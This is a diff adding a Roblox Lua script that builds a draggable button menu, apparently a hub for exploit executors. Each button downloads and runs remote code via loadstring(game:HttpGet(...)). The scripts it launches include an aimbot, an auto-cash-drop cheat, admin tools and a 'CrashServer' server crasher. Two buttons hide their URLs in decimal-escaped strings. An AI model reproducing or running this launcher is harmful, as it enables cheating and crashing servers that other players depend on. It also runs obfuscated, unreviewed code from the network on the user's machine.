@@ -1,0 +1,479 @@
+-- Gui to Lua
+-- Version: 3.2
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "Loaded!";
+	Text = "Bruh!";
+	Duration = 3;
+})
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local UIGradient = Instance.new("UIGradient")
+local recodex = Instance.new("TextButton")
+local UIGradient_2 = Instance.new("UIGradient")
+local UICorner_2 = Instance.new("UICorner")
+local trustboy = Instance.new("TextButton")
+local UIGradient_3 = Instance.new("UIGradient")
+local UICorner_3 = Instance.new("UICorner")
+local swagmode = Instance.new("TextButton")
+local UIGradient_4 = Instance.new("UIGradient")
+local UICorner_4 = Instance.new("UICorner")
+local legacyx = Instance.new("TextButton")
+local UIGradient_5 = Instance.new("UIGradient")
+local UICorner_5 = Instance.new("UICorner")
+local dahoodv1 = Instance.new("TextButton")
+local UIGradient_6 = Instance.new("UIGradient")
+local UICorner_6 = Instance.new("UICorner")
+local Btools = Instance.new("TextButton")
+local UIGradient_7 = Instance.new("UIGradient")
+local UICorner_7 = Instance.new("UICorner")
+local infiniteyield = Instance.new("TextButton")
+local UIGradient_8 = Instance.new("UIGradient")
+local UICorner_8 = Instance.new("UICorner")
+local zordion = Instance.new("TextButton")
+local UIGradient_9 = Instance.new("UIGradient")
+local UICorner_9 = Instance.new("UICorner")
+local aimbotf8 = Instance.new("TextButton")
+local UIGradient_10 = Instance.new("UIGradient")
+local UICorner_10 = Instance.new("UICorner")
+local clicktp = Instance.new("TextButton")
+local UIGradient_11 = Instance.new("UIGradient")
+local UICorner_11 = Instance.new("UICorner")
+local animationchanger = Instance.new("TextButton")
+local UIGradient_12 = Instance.new("UIGradient")
+local UICorner_12 = Instance.new("UICorner")
+local autocashdrop = Instance.new("TextButton")
+local UIGradient_13 = Instance.new("UIGradient")
+local UICorner_13 = Instance.new("UICorner")
+local crashserver = Instance.new("TextButton")
+local UIGradient_14 = Instance.new("UIGradient")
+local UICorner_14 = Instance.new("UICorner")
+local evonsgui = Instance.new("TextButton")
+local UIGradient_15 = Instance.new("UIGradient")
+local UICorner_15 = Instance.new("UICorner")
+local faded = Instance.new("TextButton")
+local UIGradient_16 = Instance.new("UIGradient")
+local UICorner_16 = Instance.new("UICorner")
+local modpanel = Instance.new("TextButton")
+local UIGradient_17 = Instance.new("UIGradient")
+local UICorner_17 = Instance.new("UICorner")
+local valiant = Instance.new("TextButton")
+local UIGradient_18 = Instance.new("UIGradient")
+local UICorner_18 = Instance.new("UICorner")
+local rejoin = Instance.new("TextButton")
+local UIGradient_19 = Instance.new("UIGradient")
+local UICorner_19 = Instance.new("UICorner")
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ResetOnSpawn = false
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.Position = UDim2.new(0.412112206, 0, 0.0204081628, 0)
+Frame.Size = UDim2.new(0, 434, 0, 635)
+Frame.Visible = true
+Frame.Active = true
+Frame.Draggable = true
+
+UICorner.Parent = Frame
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient.Parent = Frame
+
+recodex.Name = "recodex"
+recodex.Parent = Frame
+recodex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+recodex.Size = UDim2.new(0, 200, 0, 50)
+recodex.Font = Enum.Font.Cartoon
+recodex.Text = "Recodex"
+recodex.TextColor3 = Color3.fromRGB(0, 0, 0)
+recodex.TextScaled = true
+recodex.TextSize = 14.000
+recodex.TextWrapped = true
+recodex.MouseButton1Down:connect(function()
+	loadstring(game:GetObjects("rbxassetid://5812737894")[1].Source)()
+end)
+
+UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_2.Parent = recodex
+
+UICorner_2.Parent = recodex
+
+trustboy.Name = "trustboy"
+trustboy.Parent = Frame
+trustboy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+trustboy.Position = UDim2.new(0, 0, 0.095116362, 0)
+trustboy.Size = UDim2.new(0, 200, 0, 50)
+trustboy.Font = Enum.Font.Cartoon
+trustboy.Text = "TrustBoy"
+trustboy.TextColor3 = Color3.fromRGB(0, 0, 0)
+trustboy.TextScaled = true
+trustboy.TextSize = 14.000
+trustboy.TextWrapped = true
+trustboy.MouseButton1Down:connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\71\83\50\49\79\102\102\105\99\105\97\108\47\84\114\117\115\116\66\111\121\45\80\114\101\109\105\117\109\47\109\97\105\110\47\84\114\117\115\116\66\111\121\37\50\48\80\114\101\109\105\117\109\37\50\48\66\69\84\65\37\50\48\48\46\48\49\34\41\41\40\41\10")()
+end)
+
+UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_3.Parent = trustboy
+
+UICorner_3.Parent = trustboy
+
+swagmode.Name = "swagmode"
+swagmode.Parent = Frame
+swagmode.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+swagmode.Position = UDim2.new(0, 0, 0.193662807, 0)
+swagmode.Size = UDim2.new(0, 200, 0, 50)
+swagmode.Font = Enum.Font.Cartoon
+swagmode.Text = "SwagMode"
+swagmode.TextColor3 = Color3.fromRGB(0, 0, 0)
+swagmode.TextScaled = true
+swagmode.TextSize = 14.000
+swagmode.TextWrapped = true
+swagmode.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002"))()
+end)
+
+UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_4.Parent = swagmode
+
+UICorner_4.Parent = swagmode
+
+legacyx.Name = "legacyx"
+legacyx.Parent = Frame
+legacyx.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+legacyx.Position = UDim2.new(0, 0, 0.296653181, 0)
+legacyx.Size = UDim2.new(0, 200, 0, 50)
+legacyx.Font = Enum.Font.Cartoon
+legacyx.Text = "LegacyX"
+legacyx.TextColor3 = Color3.fromRGB(0, 0, 0)
+legacyx.TextScaled = true
+legacyx.TextSize = 14.000
+legacyx.TextWrapped = true
+legacyx.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Compwnter/LegacyX/main/script.lua'), true))()
+end)
+
+UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_5.Parent = legacyx
+
+UICorner_5.Parent = legacyx
+
+dahoodv1.Name = "dahoodv1"
+dahoodv1.Parent = Frame
+dahoodv1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+dahoodv1.Position = UDim2.new(0.506699443, 0, 0.698496759, 0)
+dahoodv1.Size = UDim2.new(0, 200, 0, 50)
+dahoodv1.Font = Enum.Font.Cartoon
+dahoodv1.Text = "DaHoodV.1"
+dahoodv1.TextColor3 = Color3.fromRGB(0, 0, 0)
+dahoodv1.TextScaled = true
+dahoodv1.TextSize = 14.000
+dahoodv1.TextWrapped = true
+dahoodv1.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/lIlIlIlIIlllIIllI/Main/main/v.1", true))()
+end)
+
+UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_6.Parent = dahoodv1
+
+UICorner_6.Parent = dahoodv1
+
+Btools.Name = "Btools"
+Btools.Parent = Frame
+Btools.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Btools.Position = UDim2.new(0.506699443, 0, 0, 0)
+Btools.Size = UDim2.new(0, 200, 0, 50)
+Btools.Font = Enum.Font.Cartoon
+Btools.Text = "Btools"
+Btools.TextColor3 = Color3.fromRGB(0, 0, 0)
+Btools.TextScaled = true
+Btools.TextSize = 14.000
+Btools.TextWrapped = true
+Btools.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/lIlIlIlIIlllIIllI/Main/main/btools", true))()
+end)
+
+UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_7.Parent = Btools
+
+UICorner_7.Parent = Btools
+
+infiniteyield.Name = "infiniteyield"
+infiniteyield.Parent = Frame
+infiniteyield.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+infiniteyield.Position = UDim2.new(0.506699443, 0, 0.095116362, 0)
+infiniteyield.Size = UDim2.new(0, 200, 0, 50)
+infiniteyield.Font = Enum.Font.Cartoon
+infiniteyield.Text = "InfiniteYield"
+infiniteyield.TextColor3 = Color3.fromRGB(0, 0, 0)
+infiniteyield.TextScaled = true
+infiniteyield.TextSize = 14.000
+infiniteyield.TextWrapped = true
+infiniteyield.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+UIGradient_8.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_8.Parent = infiniteyield
+
+UICorner_8.Parent = infiniteyield
+
+zordion.Name = "zordion"
+zordion.Parent = Frame
+zordion.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+zordion.Position = UDim2.new(0.506699443, 0, 0.193662807, 0)
+zordion.Size = UDim2.new(0, 200, 0, 50)
+zordion.Font = Enum.Font.Cartoon
+zordion.Text = "Zordion"
+zordion.TextColor3 = Color3.fromRGB(0, 0, 0)
+zordion.TextScaled = true
+zordion.TextSize = 14.000
+zordion.TextWrapped = true
+zordion.MouseButton1Down:connect(function()
+	repeat
+		wait()
+	until game:IsLoaded()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/zordion/main/script.lua"))()
+end)
+
+UIGradient_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_9.Parent = zordion
+
+UICorner_9.Parent = zordion
+
+aimbotf8.Name = "aimbotf8"
+aimbotf8.Parent = Frame
+aimbotf8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+aimbotf8.Position = UDim2.new(0.506699443, 0, 0.296653181, 0)
+aimbotf8.Size = UDim2.new(0, 200, 0, 50)
+aimbotf8.Font = Enum.Font.Cartoon
+aimbotf8.Text = "Aimbot"
+aimbotf8.TextColor3 = Color3.fromRGB(0, 0, 0)
+aimbotf8.TextScaled = true
+aimbotf8.TextSize = 14.000
+aimbotf8.TextWrapped = true
+aimbotf8.MouseButton1Down:connect(function()
+	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Enviie/Cypher-X-DaHoodian-Ware/main/Cypher%20X%20DaHoodian-Ware%20Main.lua"))("Enviie Soo Hot!")
+end)
+
+UIGradient_10.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_10.Parent = aimbotf8
+
+UICorner_10.Parent = aimbotf8
+
+clicktp.Name = "clicktp"
+clicktp.Parent = Frame
+clicktp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+clicktp.Position = UDim2.new(0.506699443, 0, 0.396493942, 0)
+clicktp.Size = UDim2.new(0, 200, 0, 50)
+clicktp.Font = Enum.Font.Cartoon
+clicktp.Text = "ClickTp"
+clicktp.TextColor3 = Color3.fromRGB(0, 0, 0)
+clicktp.TextScaled = true
+clicktp.TextSize = 14.000
+clicktp.TextWrapped = true
+clicktp.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/lIlIlIlIIlllIIllI/Main/main/clicktp", true))()
+end)
+
+UIGradient_11.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_11.Parent = clicktp
+
+UICorner_11.Parent = clicktp
+
+animationchanger.Name = "animationchanger"
+animationchanger.Parent = Frame
+animationchanger.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+animationchanger.Position = UDim2.new(0.506699443, 0, 0.490207881, 0)
+animationchanger.Size = UDim2.new(0, 200, 0, 50)
+animationchanger.Font = Enum.Font.Cartoon
+animationchanger.Text = "AnimationChanger"
+animationchanger.TextColor3 = Color3.fromRGB(0, 0, 0)
+animationchanger.TextScaled = true
+animationchanger.TextSize = 14.000
+animationchanger.TextWrapped = true
+animationchanger.MouseButton1Down:connect(function()
+	teclaopen = "N" --- Change the key, for the one you like to close the GUI
+
+	loadstring(game:HttpGet("https://god-x.000webhostapp.com/linkAnimatorEdit.lua", true))()
+end)
+
+UIGradient_12.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_12.Parent = animationchanger
+
+UICorner_12.Parent = animationchanger
+
+autocashdrop.Name = "autocashdrop"
+autocashdrop.Parent = Frame
+autocashdrop.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+autocashdrop.Position = UDim2.new(0, 0, 0.396493942, 0)
+autocashdrop.Size = UDim2.new(0, 200, 0, 50)
+autocashdrop.Font = Enum.Font.Cartoon
+autocashdrop.Text = "AutoCashDrop"
+autocashdrop.TextColor3 = Color3.fromRGB(0, 0, 0)
+autocashdrop.TextScaled = true
+autocashdrop.TextSize = 14.000
+autocashdrop.TextWrapped = true
+autocashdrop.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop%22"), true))()
+end)
+
+UIGradient_13.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_13.Parent = autocashdrop
+
+UICorner_13.Parent = autocashdrop
+
+crashserver.Name = "crashserver"
+crashserver.Parent = Frame
+crashserver.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+crashserver.Position = UDim2.new(0, 0, 0.491782665, 0)
+crashserver.Size = UDim2.new(0, 200, 0, 50)
+crashserver.Font = Enum.Font.Cartoon
+crashserver.Text = "CrashServer"
+crashserver.TextColor3 = Color3.fromRGB(0, 0, 0)
+crashserver.TextScaled = true
+crashserver.TextSize = 14.000
+crashserver.TextWrapped = true
+crashserver.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+UIGradient_14.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_14.Parent = crashserver
+
+UICorner_14.Parent = crashserver
+
+evonsgui.Name = "evonsgui"
+evonsgui.Parent = Frame
+evonsgui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+evonsgui.Position = UDim2.new(0, 0, 0.584763288, 0)
+evonsgui.Size = UDim2.new(0, 200, 0, 50)
+evonsgui.Font = Enum.Font.Cartoon
+evonsgui.Text = "EvonsGui"
+evonsgui.TextColor3 = Color3.fromRGB(0, 0, 0)
+evonsgui.TextScaled = true
+evonsgui.TextSize = 14.000
+evonsgui.TextWrapped = true
+evonsgui.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/lIlIlIlIIlllIIllI/Scripts/main/evonsgui", true))()
+end)
+
+UIGradient_15.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_15.Parent = evonsgui
+
+UICorner_15.Parent = evonsgui
+
+faded.Name = "faded"
+faded.Parent = Frame
+faded.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+faded.Position = UDim2.new(0, 0, 0.698496759, 0)
+faded.Size = UDim2.new(0, 200, 0, 50)
+faded.Font = Enum.Font.Cartoon
+faded.Text = "Faded"
+faded.TextColor3 = Color3.fromRGB(0, 0, 0)
+faded.TextScaled = true
+faded.TextSize = 14.000
+faded.TextWrapped = true
+faded.MouseButton1Down:connect(function()
+
+	--BROUGHT TO YOU BY RSCRIPTS.NET--
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/nighter132/Faded/main/YesEpic", true))()
+
+end)
+
+UIGradient_16.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_16.Parent = faded
+
+UICorner_16.Parent = faded
+
+modpanel.Name = "modpanel"
+modpanel.Parent = Frame
+modpanel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+modpanel.Position = UDim2.new(0.506699443, 0, 0.584763288, 0)
+modpanel.Size = UDim2.new(0, 200, 0, 50)
+modpanel.Font = Enum.Font.Cartoon
+modpanel.Text = "ModPanel \"J\""
+modpanel.TextColor3 = Color3.fromRGB(0, 0, 0)
+modpanel.TextScaled = true
+modpanel.TextSize = 14.000
+modpanel.TextWrapped = true
+modpanel.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/lIlIlIlIIlllIIllI/Scripts/main/mod", true))()
+end)
+
+UIGradient_17.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_17.Parent = modpanel
+
+UICorner_17.Parent = modpanel
+
+valiant.Name = "valiant"
+valiant.Parent = Frame
+valiant.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+valiant.Position = UDim2.new(-0.000213027, 0, 0.797709346, 0)
+valiant.Size = UDim2.new(0, 200, 0, 50)
+valiant.Font = Enum.Font.Cartoon
+valiant.Text = "Valiant"
+valiant.TextColor3 = Color3.fromRGB(0, 0, 0)
+valiant.TextScaled = true
+valiant.TextSize = 14.000
+valiant.TextWrapped = true
+valiant.MouseButton1Down:connect(function()
+	repeat
+		wait();
+	until game:IsLoaded() and game:GetService("Players").LocalPlayer;
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\86\97\110\105\115\50\53\50\47\118\97\108\105\97\110\116\47\109\97\105\110\47\46\103\105\116\105\103\110\111\114\101\34\41\44\32\116\114\117\101\41\41\40\41\10")();
+	-- DISCORD : https://discord.gg/EH6XXsBeEv
+end)
+
+UIGradient_18.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_18.Parent = valiant
+
+UICorner_18.Parent = valiant
+
+rejoin.Name = "rejoin"
+rejoin.Parent = Frame
+rejoin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+rejoin.Position = UDim2.new(0.506699443, 0, 0.797709346, 0)
+rejoin.Size = UDim2.new(0, 200, 0, 50)
+rejoin.Font = Enum.Font.Cartoon
+rejoin.Text = "Rejoin"
+rejoin.TextColor3 = Color3.fromRGB(0, 0, 0)
+rejoin.TextScaled = true
+rejoin.TextSize = 14.000
+rejoin.TextWrapped = true
+rejoin.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("UrlHere", true))()
+end)
+
+UIGradient_19.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 5, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 5, 5))}
+UIGradient_19.Parent = rejoin
+
+UICorner_19.Parent = rejoin
+
+-- Scripts:
+
+local function MFID_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	-- Add a localscript to ur frame and put this code
+	function PopupGui()
+		if script.Parent.Visible == true then script.Parent.Visible = false
+		else script.Parent.Visible = true
+		end
+	end
+	
+	game:GetService("UserInputService").InputBegan:Connect(function(key)
+		if key.KeyCode == Enum.KeyCode.M then
+			PopupGui()
+		end
+	end)
+	
+	-- Made By Vizual
+end
+coroutine.wrap(MFID_fake_script)()
